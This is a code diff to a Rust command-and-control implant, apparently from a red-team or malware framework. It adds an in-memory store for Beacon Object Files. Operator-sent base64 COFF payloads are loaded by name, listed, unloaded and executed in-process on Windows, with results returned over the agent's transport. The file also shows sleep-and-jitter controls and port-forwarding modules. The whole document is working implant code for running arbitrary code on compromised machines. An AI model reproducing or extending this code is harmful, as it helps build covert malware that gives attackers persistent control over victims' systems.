@@ -47,10 +47,50 @@ mod pipe_server;
 mod portfwd;
 
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
-use std::sync::{Mutex, OnceLock};
+use std::sync::{Arc, Mutex, OnceLock};
+use std::collections::HashMap;
 use std::process::Command;
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use crate::transport::{AgentTransport, TaskWire};
+
+// ── BOF in-process store ─────────────────────────────────────────────────────
+
+static BOF_STORE: OnceLock<Arc<Mutex<HashMap<String, Vec<u8>>>>> = OnceLock::new();
+
+fn bof_store_get_map() -> Arc<Mutex<HashMap<String, Vec<u8>>>> {
+    BOF_STORE.get_or_init(|| Arc::new(Mutex::new(HashMap::new()))).clone()
+}
+
+fn bof_store_load(name: &str, data: Vec<u8>) -> String {
+    let len = data.len();
+    bof_store_get_map().lock().unwrap().insert(name.to_string(), data);
+    format!("[+] BOF '{}' loaded into store ({} bytes)", name, len)
+}
+
+fn bof_store_get(name: &str) -> Option<Vec<u8>> {
+    bof_store_get_map().lock().unwrap().get(name).cloned()
+}
+
+fn bof_store_list() -> String {
+    let m = bof_store_get_map();
+    let lock = m.lock().unwrap();
+    if lock.is_empty() { return "(bof store empty)".to_string(); }
+    let mut lines: Vec<String> = lock.iter()
+        .map(|(k, v)| format!("  {:<30}  {} bytes", k, v.len()))
+        .collect();
+    lines.sort();
+    lines.join("\n")
+}
+
+fn bof_store_unload(name: &str) -> String {
+    let m = bof_store_get_map();
+    let mut lock = m.lock().unwrap();
+    if lock.remove(name).is_some() {
+        format!("[+] BOF '{}' removed from store", name)
+    } else {
+        format!("[-] BOF '{}' not in store", name)
+    }
+}
 
 pub static DYN_SLEEP_SEC:  AtomicU64 = AtomicU64::new(u64::MAX);
 pub static DYN_JITTER_PCT: AtomicU64 = AtomicU64::new(u64::MAX);
@@ -1300,17 +1340,24 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         "BOF" => {
             #[cfg(target_os = "windows")]
             {
-                use base64::Engine as _;
                 let args_obj: serde_json::Value = serde_json::from_str(task.args.as_str())
                     .unwrap_or_default();
                 let coff_b64 = args_obj["coff_b64"].as_str().unwrap_or("");
                 let args_b64 = args_obj["args_b64"].as_str().unwrap_or("");
-                let coff = base64::engine::general_purpose::STANDARD
-                    .decode(coff_b64)
-                    .unwrap_or_default();
-                let packed = base64::engine::general_purpose::STANDARD
-                    .decode(args_b64)
-                    .unwrap_or_default();
+                let coff = if !coff_b64.is_empty() {
+                    STANDARD.decode(coff_b64).unwrap_or_default()
+                } else {
+                    // Try store: args = "<name>" (plain string, not JSON)
+                    let name = task.args.split_whitespace().next().unwrap_or("").to_string();
+                    match bof_store_get(&name) {
+                        Some(data) => data,
+                        None => {
+                            t.send_result(task.id, "", "BOF: missing COFF payload (not in store)");
+                            return;
+                        }
+                    }
+                };
+                let packed = STANDARD.decode(args_b64).unwrap_or_default();
                 match crate::bof::exec_bof(&coff, &packed) {
                     Ok(out) => t.send_result(task.id, &out, ""),
                     Err(e)  => t.send_result(task.id, "", &e),
@@ -1480,9 +1527,25 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             t.send_result(task.id, &out, "");
         }
 
-        // ── BOF store (stub — use BOF with direct payload) ────────────────────
-        "BOF_STORE_LOAD" | "BOF_STORE_LIST" | "BOF_STORE_UNLOAD" => {
-            t.send_result(task.id, "(bof store not supported in Rust agent — use BOF with payload)", "");
+        // ── BOF store ─────────────────────────────────────────────────────────
+        "BOF_STORE_LOAD" => {
+            let name = task.args.trim().to_string();
+            if name.is_empty() {
+                t.send_result(task.id, "", "usage: BOF_STORE_LOAD <name>  (payload=base64 COFF)");
+                return;
+            }
+            let data = STANDARD.decode(&task.payload).unwrap_or_default();
+            if data.is_empty() {
+                t.send_result(task.id, "", "BOF_STORE_LOAD: empty payload");
+                return;
+            }
+            t.send_result(task.id, &bof_store_load(&name, data), "");
+        }
+        "BOF_STORE_LIST" => {
+            t.send_result(task.id, &bof_store_list(), "");
+        }
+        "BOF_STORE_UNLOAD" => {
+            t.send_result(task.id, &bof_store_unload(task.args.trim()), "");
         }
 
         // ── Agent state ───────────────────────────────────────────────────────
